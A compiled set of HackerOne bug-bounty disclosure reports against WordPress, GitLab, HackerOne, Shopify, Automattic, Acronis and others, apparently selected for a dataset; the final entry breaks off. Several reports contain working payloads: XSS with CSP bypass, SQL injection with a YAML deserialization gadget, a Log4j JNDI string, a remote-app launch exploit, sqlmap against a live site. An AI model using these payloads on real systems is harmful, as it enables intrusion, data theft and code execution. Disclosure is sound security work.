@@ -1,0 +1,3309 @@
+
+HIGH COMPLEXITY/NOVELTY MULTI-COMPONENT REPORTS
+==================================================
+
+Total reports in group: 376
+Selected reports: 15
+
+Report File: 436928.json
+------------------------------
+Report To: WordPress
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: True
+Weaknesses:
+- Path Traversal
+
+Contents:
+
+This vulnerability was found when I found myself in the following scenario:
+My collegue set up WordPress on his local machine and challenged me to hack it. Before he gave me admin access he used the following hardeing mechanisms:
+PHP Safe mode
+The entire web directory was not writable
+Disabled WordPress File edit
+Disabled the ability to install plugins
+The RCE demonsrated here allowed me to bypass all these restrictions and still execute arbitrary code on the machine.
+At fault is the wp_mkdir_p(); function.
+Overwriting directory permissions
+wp_mkdir_p() is called by wp_upload_dir() when a user wants to upload a new media file. If the upload directory does not exist, WordPress will attempt to create it. WordPress determines what the upload directory is dynamically by calling get_option('upload_path').
+Code 441 Bytes
+1function _wp_upload_dir( $time = null ) {
+2	$siteurl = get_option( 'siteurl' );
+3	$upload_path = trim( get_option( 'upload_path' ) );
+4
+5	if ( empty( $upload_path ) || 'wp-content/uploads' == $upload_path ) {
+6		$dir = WP_CONTENT_DIR . '/uploads';
+7	} elseif ( 0 !== strpos( $upload_path, ABSPATH ) ) {
+8		// $dir is absolute, $upload_path is (maybe) relative to ABSPATH
+9		$dir = path_join( ABSPATH, $upload_path );
+10	} else {
+11		$dir = $upload_path;
+Administrators can update that option to an arbitrary value in wp-admin/options.php
+The value returned by _wp_upload_dir() is then passed to wp_mkdir_p();
+Code 1.03 KiB
+1function wp_mkdir_p( $target ) {
+2...
+3
+4	if ( file_exists( $target ) )
+5		return @is_dir( $target );
+6
+7	// We need to find the permissions of the parent folder that exists and inherit that.
+8	$target_parent = dirname( $target );
+9	while ( '.' != $target_parent && ! is_dir( $target_parent ) && dirname( $target_parent ) !== $target_parent ) {
+10		$target_parent = dirname( $target_parent );
+11	}
+12
+13	// Get the permission bits.
+14	if ( $stat = @stat( $target_parent ) ) {
+15		$dir_perms = $stat['mode'] & 0007777;
+16	} else {
+17		$dir_perms = 0777;
+18	}
+19
+20	if ( @mkdir( $target, $dir_perms, true ) ) {
+21
+22		/*
+23		 * If a umask is set that modifies $dir_perms, we'll have to re-set
+24		 * the $dir_perms correctly with chmod()
+25		 */
+26		if ( $dir_perms != ( $dir_perms & ~umask() ) ) {
+27			$folder_parts = explode( '/', substr( $target, strlen( $target_parent ) + 1 ) );
+28			for ( $i = 1, $c = count( $folder_parts ); $i <= $c; $i++ ) {
+29				@chmod( $target_parent . '/' . implode( '/', array_slice( $folder_parts, 0, $i ) ), $dir_perms );
+30			}
+31		}
+32
+33		return true;
+34	}
+35
+36	return false;
+37}
+In order to create the directory correctly, WordPress will first find out what the parent directory is by iterating over the path via dirname(). WordPress then copies the permissions of the parent directory so that the new upload directory will inherit those permissions.
+if mkdir returns true, a check is made if our umask differs from the $dir_perms. If so, the $target path is exploded and each part of it is chmod'd with the permissions of the $target_parent.
+This function is vulnerable to a path traversal.
+If an attacker sets 'upload_path' to
+Code 114 Bytes
+1../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/../../../../../../var/tmp/content
+the $target_parent will be
+Code 29 Bytes
+1../../../../../../../var/tmp/
+which is writable, so the target permissions will be 777 (read, write, execute)
+Since realpath() of the payload is /var/tmp/content and /var/tmp is writable, the call to mkdir() is successful. Then the call to umask() is made, which we can pass and then the $target path is exploded
+and each part of it is appended to $target_parent (../../../../../../../var/tmp/) and then chmod with the permission bit of 777.
+This means at some point in the iteration the following call is made to chmod:
+Code 97 Bytes
+1chmod('../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/', 0777);
+This allowed me to set all directories writable again and bypass the first hardening mechanism.
+Uploading and executing a shell
+In my other report, 'Remote Code Execution as Author' I have demonstrated how any file in the theme directory can be included and executed via the post meta value of _wp_page_template. Please read that report if the following is unclear.
+By setting the upload_path to the theme directory and uploading a shell.txt with the content <?php phpinfo(); ?>
+and then including it, I was able to execute arbitrary code.
+Impact
+This is a universal code execution for administrators and dangers hardend WordPress installations and pretty much defeats https://codex.wordpress.org/Hardening_WordPress
+Depending on the plugins available of a target site, a simple reflected XSS can lead to RCE, even if all instructions for hardening are followed.
+
+
+
+==================================================
+
+Report File: 836649.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: HIGH
+Multi-component: True
+Weaknesses:
+- Cross-site Scripting (XSS) - Stored
+
+Contents:
+
+Summary
+It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the data-original attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:
+Code 681 Bytes
+1    def redacted_node_content(node)
+2      original_content = node.attr('data-original')
+3      link_reference = node.attr('data-link-reference')
+4
+5      # Build the raw <a> tag just with a link as href and content if
+6      # it's originally a link pattern. We shouldn't return a plain text href.
+7      original_link =
+8        if link_reference == 'true'
+9          href = node.attr('href')
+10          content = original_content
+11
+12          %(<a href="#{href}">#{content}</a>)
+13        end
+14
+15      # The reference should be replaced by the original link's content,
+16      # which is not always the same as the rendered one.
+17      original_link || original_content || node.inner_html
+18    end
+Steps to reproduce
+create a private project with one account
+create an issue in the private project
+sign into another account that does not have permission to read the above project
+link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
+
+<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
+
+The above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):
+Code 340 Bytes
+1link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
+2&lt;a 
+3  data-remote=&quot;true&quot;
+4  data-method=&quot;get&quot;
+5  data-type=&quot;script&quot;
+6  href=/wbowling/wiki/raw/master/test.js
+7  class='atwho-view select2-drop-mask pika-select'
+8&gt;
+9  &lt;img height=10000 width=10000&gt;
+10&lt;/a&gt;
+11</a>
+which generates the following html:
+Code 364 Bytes
+1<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp
+2</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">
+3<img height="10000" width="10000">
+4</a>
+5</p></div>
+Impact
+Anywhere the ReferenceRedactor is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss
+Examples
+example payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1
+with csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2
+What is the current bug behavior?
+The data-original attribute can be abused to inject arbitrary html when a reference is redacted.
+What is the expected correct behavior?
+The data-original should be double encoded or filtered before being reused.
+Relevant logs and/or screenshots
+<image_0>
+Output of checks
+Happens on gitlab.com
+Results of GitLab environment info
+Code 853 Bytes
+1System information
+2System:		Ubuntu 18.04
+3Proxy:		no
+4Current User:	git
+5Using RVM:	no
+6Ruby Version:	2.6.5p114
+7Gem Version:	2.7.10
+8Bundler Version:1.17.3
+9Rake Version:	12.3.3
+10Redis Version:	5.0.7
+11Git Version:	2.24.1
+12Sidekiq Version:5.2.7
+13Go Version:	unknown
+14
+15GitLab information
+16Version:	12.9.2-ee
+17Revision:	0ad76f4d374
+18Directory:	/opt/gitlab/embedded/service/gitlab-rails
+19DB Adapter:	PostgreSQL
+20DB Version:	10.12
+21URL:		http://gitlab-vm.local
+22HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
+23SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
+24Elasticsearch:	no
+25Geo:		no
+26Using LDAP:	no
+27Using Omniauth:	yes
+28Omniauth Providers:
+29
+30GitLab Shell
+31Version:	12.0.0
+32Repository storage paths:
+33- default: 	/var/opt/gitlab/git-data/repositories
+34GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
+35Git:		/opt/gitlab/embedded/bin/git
+Impact
+Anywhere the ReferenceRedactor is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss
+
+
+
+==================================================
+
+Report File: 2958619.json
+------------------------------
+Report To: MTN Group
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- SQL Injection
+
+Contents:
+
+Summary:
+<image_0>
+Steps To Reproduce:
+<image_1>
+Code 144 Bytes
+1sqlmap -u "https://seesure.admyntec.co.za/customerInsurance/newCustomerStep5Pending/customerId/732562*/contactPersonId/0/msisdn/" --batch
+2 --dbs
+<image_2>
+Impact
+Summary:
+An attacker can exploit this to dump and download the database, Which will give them access to user informations.
+
+
+
+==================================================
+
+Report File: 179164.json
+------------------------------
+Report To: Ubiquiti Inc.
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Cross-site Scripting (XSS) - Generic
+
+Contents:
+
+I have created two accounts
+one attacker account: vibhuti123_i
+other victim account: John_victim
+attacker account:vibhuti123_i who will create a malicious link after uploading svg file embeded with script and doing stored xss.Now attacker vibhuti123_i will send this stored xss malicious link to victim:john_victim by posts,message,reply of ubnt community features or anyother way of communication.After this John_victim will believe this link as it is saved on community.ubnt.com server.It's no way look dangerous so john_victim will click this link and xss gets executed.
+This stored xss link created by attacker will execute in every account and also it is accessible without login.
+http://community.ubnt.com/t5/image/serverpage/image-id/0iA7662344C5BC7B7E/image-size/thumb/is-preview/true?v=v2&px=100
+Please go through Video POC:--
+https://youtu.be/Z0UCmv-Tpqs
+PLease read the Document of OWASP.org about svg xss below:
+https://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf
+
+
+
+==================================================
+
+Report File: 2523677.json
+------------------------------
+Report To: RATELIMITED
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- None
+
+Contents:
+
+It's possible to take over subdomains that point to GitLab Pages. While adding a subdomain no verification of domain ownership is required.
+POC Steps
+Go to http://george.ratelimited.me/ (tested in Firefox)
+<image_0>
+Impact
+Attackers could perform several attacks like:
+Cookie Stealing
+Phishing campaigns.
+Bypass Content-Security Policies and CORS.
+
+
+
+==================================================
+
+Report File: 407355.json
+------------------------------
+Report To: Greenhouse.io
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Phishing
+
+Contents:
+
+Actuall this report is same as of this one:- https://hackerone.com/reports/38007
+Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.
+Here there is a greenhouse domain (demo.greenhouse.io) which is pointing towards unbounce pages so this domain can be taken over can can be used to do any type of attacks mostly i can make a fake login page on your behalf and spoof your users, this is a critical vulnerability and needs to be fixed .
+Vulnerable url : demo.greenhouse.io
+PoC
+Snapshot of the vulnerable page(actually for taking over from unbounce i need to take a paid subscription hich is of higher cost neraly 150-200$ i cannot afford that so as a poc i m showing you a vulnerable page hoping this should work )
+cname: unbouncepages.com
+Name: demo.greenhouse.io
+Type: CNAME
+Class: IN
+Impact
+Impact
+Risk
+fake website
+malicious code injection
+users tricking
+company impersonation
+This issue can have really huge impact on the companies reputation someone could post malicious content on the compromised site and then your users will think it's official but it's not.
+Remediation
+Remove the cname entry or claim the subdomain demo.greenhouse.io on unbounce.com
+See also
+https://github.com/EdOverflow/can-i-take-over-xyz#unbounce
+https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/
+https://0xpatrik.com/subdomain-takeover/
+https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd
+http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/
+Best regards,
+Hacker2202
+
+
+
+==================================================
+
+Report File: 2188240.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Violation of Secure Design Principles
+
+Contents:
+
+Vulnerability Overview
+Reported By: Ezequiel [@ezequielpuig]
+Reported Date: 01/October/2023
+Reported To: U.S. Department Of Defense
+Vulnerability Type: Subdomain Takeover
+Affected URL: www.███████
+Hello U.S. Department Of Defense Security Team, I hope this report finds you well.
+I want to bring to your attention a serious security issue that poses a significant risk to www.████████. This is related to a subdomain takeover vulnerability, which could allow malicious individuals to gain control over the subdomain and potentially misuse it for malicious purposes.
+_Overview:
+The affected subdomain is www.███, which currently points to an unclaimed CNAME record on the ████████.netlify.app. This situation allows anyone to potentially take ownership of the subdomain and manipulate its content. Since www.█████████ has a CNAME record pointing to ██████████.netlify.app, by changing the Host header to www.██████████, it is possible to visualize the malicious content hosted on █████████.netlify.app.
+Here are a few scenarios where the Host header can be modified:
+Proxy Servers: If you control a proxy server, you can intercept incoming requests and modify the Host header before forwarding the request to the intended destination. This is often done for load balancing, content caching, or security purposes.
+DNS Spoofing: In a malicious context, an attacker might attempt DNS spoofing to redirect requests to a different server with a modified Host header.
+Server-Side Scripting: If you have control over the server-side code that processes incoming requests, you can modify the Host header as part of your application logic.
+Browser Extensions: Malicious browser extensions installed can modify the Host header for all outgoing requests.
+_Proof of Concept (PoC):
+This vulnerability materializes when an HTTP request is sent to www.██████████ with a manipulated Host header.
+PoC via curl:
+curl -skS https://www.███████ --header "Host: ███.netlify.app"
+PoC via Burp Suite:
+█████████
+_Impact:
+Subdomain takeover can be exploited for various malicious purposes, including:
+Malware distribution
+Phishing / Spear phishing attacks
+Cross-Site Scripting (XSS) attacks
+Authentication bypass
+And more.
+_Mitigation:
+To address this issue and prevent potential abuse, I recommend taking the following steps:
+Remove the CNAME record from the DNS zone for www.█████████.
+Reclaim and register the affected subdomain (███.netlify.app) in the Netlify portal to prevent takeover by unauthorized entities.
+I urge you to take swift action to remediate this vulnerability to safeguard the security and reputation of U.S. Department Of Defense.
+//
+Please feel free to reach out to me if you need any further information or assistance in resolving this matter.
+Best regards,
+Ezequiel Puig
+HackerOne: https://hackerone.com/ezequielpuig
+LinkedIn: https://linkedin.com/in/ezequielpuig
+Mail: puigezequiel@gmail.com
+Impact
+Impact detailed above.
+System Host(s)
+www.██████████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Steps to reproduce detailed above.
+Suggested Mitigation/Remediation Actions
+
+
+
+==================================================
+
+Report File: 905679.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Information Disclosure
+
+Contents:
+
+Summary:
+An attacker is able to view PII (Full name/address/e-mail/phone) of all website users via █████████/████████
+Step-by-step Reproduction Instructions
+Browse to ████ and login or create an account.
+Browse to ████/███████
+Begin typing a name in the Select User field, and click the (i) icon on the right side of the field to view the users data. ██████
+Suggested Mitigation/Remediation Actions
+Restrict access to this endpoint to administrative roles.
+Impact
+An adversary can gather PII of all █████████ users via this endpoint.
+
+
+
+==================================================
+
+Report File:  .json
+------------------------------
+Report To: Shopify
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: True
+Weaknesses:
+- Cross-Site Request Forgery (CSRF)
+
+Contents:
+
+Summary:
+Shopify allows users to buy their own domain from the Shopify system. One of the facility on this is that if you buy the domain through Shopify, you can do an inter-store transfers. This means:
+You can only transfer your domain to a Shopify store owned by you. It can take up to 24 hours to complete the transfer.
+I ended up finding a CSRF that allows adding my domain to user X's store granted I know their *.myshopify.com.
+Description:
+When you request for a transfer of your domain to another store, an email is sent to you with the transfer link. This link looks like this:
+https://www.shopify.com/login?redirect=settings/domains/initiate_inter_shop_domain_transfer?transfer_code=6fa6d18a-d2d1-4114-b11e-236b20f81398
+What I realized was that it was asking me to login to my store inorder to transfer the domain. But because this would then redirect to settings/domains and initiate transfer, I decided to check what happens if I change the link to:
+https://victimstore.myshopify.com/admin/settings/domains/initiate_inter_shop_domain_transfer?transfer_code=6fa6d18a-d2d1-4114-b11e-236b20f81398.
+After I changed the link, I saved it as a HTML tag: <img src=https://victimstore.myshopify.com/admin/settings/domains/initiate_inter_shop_domain_transfer?transfer_code=6fa6d18a-d2d1-4114-b11e-236b20f81398> and saved it as a .html file. Then, I logged into my "victim" store in incognito (no previous login to any shopify store) and opened the HTML. Soon after that the domain was transferred to the victim store.
+The interesting part here is that it copies not just the domain but the DNS data as well. This not only included the MX, A, NS records but email forwarders and custom subdomains that I as an attacker would set prior to transferring.
+Steps To Reproduce:
+(Add details for how we can reproduce the issue)
+Not sure when the transfer link expires so if this does not work, please ping me on Slack
+Edit the attached html and replace YOURSTORE with your myshopify.com domain. You will then realize that going to h1-5142.com will redirect to your store.
+Impact
+Domain changes to victim's store. I will look into this more in the coming week to escalate the attack further (possibly to steal store info and payment details).
+
+
+
+==================================================
+
+Report File: 1663299.json
+------------------------------
+Report To: HackerOne
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- SQL Injection
+
+Contents:
+
+HackerOne has an internal backend interface that gives debugging capabilities to its engineers. One of the features is the ability to run EXPLAIN ANALYZE queries against a connected database. This feature is accessible by a handful of engineers. The feature is vulnerable to a SQL injection that allows an attacker to escape the transaction that is wrapped around the EXPLAIN ANALYZE query. This SQL injection can be leveraged to execute arbitrary ruby on an application server.
+This vulnerability will be demonstrated against a local development environment.
+Proof of concept
+go to http://localhost:8080/support/sql_query_analyzer
+analyze the following query using the public database connection:
+Code 980 Bytes
+1SELECT
+2        1
+3;
+4
+5ROLLBACK
+6;
+7
+8INSERT
+9    INTO
+10        user_versions (
+11            item_type
+12            ,item_id
+13            ,event
+14            ,email
+15            ,object
+16        )
+17    VALUES (
+18        'User'
+19        ,2
+20        ,'update'
+21        , 'uniquekeywordtotriggercode@hackerone.com'
+22        ,'---
+23username:
+24  - !ruby/object:Gem::Installer
+25      i: x
+26  - !ruby/object:Gem::SpecFetcher
+27      i: y
+28  - !ruby/object:Gem::Requirement
+29    requirements:
+30      !ruby/object:Gem::Package::TarReader
+31      io: &1 !ruby/object:Net::BufferedIO
+32        io: &1 !ruby/object:Gem::Package::TarReader::Entry
+33            read: 0
+34            header: "abc"
+35        debug_output: &1 !ruby/object:Net::WriteAdapter
+36            socket: &1 !ruby/object:Gem::RequestSet
+37                sets: !ruby/object:Net::WriteAdapter
+38                    socket: !ruby/module ''Kernel''
+39                    method_id: :system
+40                git_set: sleep 600
+41            method_id: :resolve '
+42    )
+43;
+44
+45-- 
+visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com and observe that the page will hang for 600 seconds and then result in a 500 internal server error, proving that it executes the sleep 600 command in the injected object.
+Root cause
+The following Ruby code is used to execute the EXPLAIN ANALYZE query:
+Code 497 Bytes
+1# ...
+2explain_analyze = "EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}"
+3
+4begin
+5  conn.transaction(requires_new: true) do
+6    block = proc do
+7      analyze_result = conn.protected_attribute.with_parameters(params) do
+8        conn.execute explain_analyze
+9      end
+10
+11      fail ActiveRecord::Rollback
+12    end
+13
+14    if config[:use_protected_schema]
+15      ProtectedAttribute::SchemaUtility.with_requester(user) do
+16        block.call
+17      end
+18    else
+19      block.call
+20    end
+21# ...
+The code is written so that it would wrap each analyze query in a transaction. This avoids permanent side effects of running the query, because EXPLAIN ANALYZE will still execute the SQL query. The interpolation of the raw_sql variable can be used to escape the current transactions and make any changes persist. The following part is used to jump out of the transaction:
+Code 30 Bytes
+1SELECT
+2        1
+3;
+4
+5ROLLBACK
+6;
+Then, a payload is injected into a table called user_versions and a comment identifier (-- ) is used to block the ROLLBACK statement that is appended by the transaction block. The user_versions table keeps a paper trail of changes on User objects. For example, when someone changes their username, the application keeps a snapshot of the previous object in the user_versions table. HackerOne uses a gem called paper_trail for this. This gem comes with a useful function to reinstantiate an old version of an object, called reify. When this method is called, the YAML from the object attribute is deseriealized and is used to initialize the class stored in the item_type column. This method inherently trusts the object stored in object however. Because the attacker can persist a new version, it can control the object that would be deserialized. In the past, multiple YAML deserialization techniques have been published. For the proof of concept, I reused Stratum Security's payload from 2021.
+There is only one place where the reify method is called on a UserVersion object, and it's through the historic users feature. It's using the following code:
+Code 348 Bytes
+1def index
+2  if params[:historic_user_input].present?
+3    if params[:historic_user_input].include? '@'
+4      versions = UserVersion.where(email: params[:historic_user_input]).order(id: :asc).to_a
+5      current_owner = User.find_by(email: params[:historic_user_input])
+6    else
+7      # ...
+8    end
+9
+10    # ...
+11
+12    original_user = versions.first.reify
+This code will pull all UserVersion objects based on the email attribute and sorts them based on the primary key ascending. Because we also can control the email attribute through the SQL injection, we need to simply persist a version with a value that is unique in the table, such as uniquekeywordtotriggercode@hackerone.com. When the page is loaded with that as the value for the historic_user_input, it will only return our injected object and reinstantiate it, leading to the execution of arbitrary ruby code or, in this case, a command.
+Impact
+Execution of arbitrary ruby code.
+
+
+
+==================================================
+
+Report File: 904659.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Information Disclosure
+
+Contents:
+
+Summary:
+The ██████████ website allows access to PII of all site users via faulty access control to the /██████ endpoint.
+Step-by-step Reproduction Instructions
+Browse to ████████ and login or create an account.
+Browse to ███████/████████. You will be able to access PII of all site users (click a username to view the PII).
+Suggested Mitigation/Remediation Actions
+Restrict access to the /██████████ module to only administrative users.
+Impact
+An adversary can gain access to PII of all ███████ users.
+
+
+
+==================================================
+
+Report File: 301458.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Code Injection
+
+Contents:
+
+An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution.
+This issue looks to be around this line of code:
+https://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38
+If shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser). If we pass the an a .app file on MacOS or an exe it will just execute the code.
+We also link to a remote readable NFS mount (or windows share) to point to a remote executable.
+A Wordpress page is created with:
+Code 131 Bytes
+1<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center> 
+This file has the following code:
+Code 159 Bytes
+1   <script>
+2      // window.open('file:///Applications/Calculator.app');
+3      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')
+4   </script>
+The file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:
+Code 147 Bytes
+1tell application "Terminal"
+2    do script "cat /etc/hosts"
+3    display dialog "You just got hacked!"
+4end tell
+5
+6do shell script "open -a Calculator"
+POC
+Create the setup described above.
+Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the "reader")
+Code is executed when the user views the page.
+See attached video for a working POC.
+Sugested Fix:
+Before passing a url to shell.openExternal the application should validate that it begins with http:// or https://.
+Impact
+An attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run.
+The remote attacker would be able to run any code as the current user on the system once the page is viewed.
+In my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.
+
+
+
+==================================================
+
+Report File: 942629.json
+------------------------------
+Report To: GSA Bounty
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- None
+
+Contents:
+
+An attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause
+502 response code。
+To replicate:
+load https://www.data.gov/ in your browser.
+look the burp , add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.
+load https://www.data.gov/?xyzxyz=1 in your browser. again.
+and you win see 502 ERROR
+<image_0>
+my http request：
+Code 551 Bytes
+1GET /?xyzxyz=1 HTTP/1.1
+2Host: www.data.gov
+3Connection: close
+4Cache-Control: max-age=0
+5Upgrade-Insecure-Requests: 1
+6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+8Sec-Fetch-Site: none
+9Sec-Fetch-Mode: navigate
+10Sec-Fetch-User: ?1
+11h0st: wrtqvavjigwdvoqk
+12Sec-Fetch-Dest: document
+13Accept-Encoding: gzip, deflate
+14Accept-Language: zh-CN,zh;q=0.9
+15
+For more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
+Similar report：
+https://hackerone.com/reports/622122
+https://hackerone.com/reports/409370
+Impact
+An attacker can persistently block access to any on https://www.data.gov/
+
+
+
+==================================================
+
+Report File: 1102780.json
+------------------------------
+Report To: Nextcloud
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Sumarry :
+I found a information disclosure for bypassing parameter url attacker can redirect to dashboard without login user/pass page
+and websocket can be exposed in response/dashboard.
+URL Effected
+https://support.nextcloud.com/#password_reset
+Steps To Reproduce:
+Opened directory at https://support.nextcloud.com/#password_reset
+Forget-password and repeat url to burp-suite
+In directory added a parameter bypass is //%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//
+and look a responsive , you can be redirect to dashboard panel without user/pass
+Show the network-browser and you can found api directory and websocket
+Directory websocket is https://support.nextcloud.com/api/v1/signshow
+Opened it and Boom You can see Information disclosure through websocket
+Request
+Code 227 Bytes
+1GET #password_reset/%0d%0aSet-Cookie:%20crlf-injection=mickey HTTP/1.1
+2Host: support.nextcloud.com
+3Accept-Language: en-US,en;q=0.5
+4Accept-Encoding: gzip, deflate
+5Connection: close
+6Upgrade-Insecure-Requests: 1
+7Content-Length: 91
+Screenshots POC
+█████
+██████
+███████
+███
+Impact
+It may cause the attacker to log into the dashboard page without logging in via user/pass, and the attacker finds sensitive files on open fires.
+
+
+
+==================================================
+
+Report File: 2587953.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: True
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Hii Triager,
+NOTE: Just to clarify, I reported a similar issue yesterday, but it was on a different endpoint. In this report, the vulnerable domain is the same, but the endpoint is different.
+I found that an attacker can change their email address to the victim's(existing user) email, which then leads to permanent account deletion of the victim's account.
+User-A: Attacker
+User-B: Victim
+Both User-A & User-B are registered user & have their separate accounts on https://www.██████████/852585B6003EBA25/CreateAccount.html
+Impact
+Possible Account Takeover (Probably)
+Permanent Account Deletion
+Improper Authentication on change email functionality.
+System Host(s)
+www.█████████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+1 - Login to Attacker's account, User-A (attacker@email.com)
+2 - Login to Victim's Account, User-B (victim@email.com)
+3 - In the Attacker's account, Navigate to the Change Your Email Address section.
+4- Change the Attacker's email to victim@email.com. You can successfully take over the victim's email. (probably victim account)
+5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
+This is the indication of an Email Takeover of the victim's account
+6 - Now, Navigate to the Attacker's account & change the email back to attacker@email.com
+7 - Navigate to the Registration page, Enter the victim's email victim@email.com & click Check Availability. You'll see that the victim's email is deleted from the DB & available for a new account.
+This is the indication of Permanent deletion of the Victim's account.
+Video PoC
+████
+Suggested Mitigation/Remediation Actions
+Set proper authentication on the Update Profile functionality.
+
+
+
+==================================================
+
+
+HIGH COMPLEXITY/NOVELTY SINGLE-COMPONENT REPORTS
+==================================================
+
+Total reports in group: 17
+Selected reports: 15
+
+Report File: 1425474.json
+------------------------------
+Report To: Acronis
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: HIGH
+Multi-component: False
+Weaknesses:
+- Deserialization of Untrusted Data
+
+Contents:
+
+Summary
+The website at nps.acronis.com is vulnerable to CVE-2021-44228
+Steps To Reproduce
+I used this script to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them.
+Construct the payload: ${jdni:ldap://nps.acronis.com.<your-server>/test}
+Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: python3 log4j-scan.py -u 'https://marketingportal.engelvoelkers.com'
+Observe the callback, proving the deserialization of untrusted data which leads to rce
+<image_0>
+Recommendations
+Update log4j to the latest version
+If updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true.
+Impact
+Remote Code Execution (rce)
+
+
+
+==================================================
+
+Report File: 767482.json
+------------------------------
+Report To: MTN Group
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
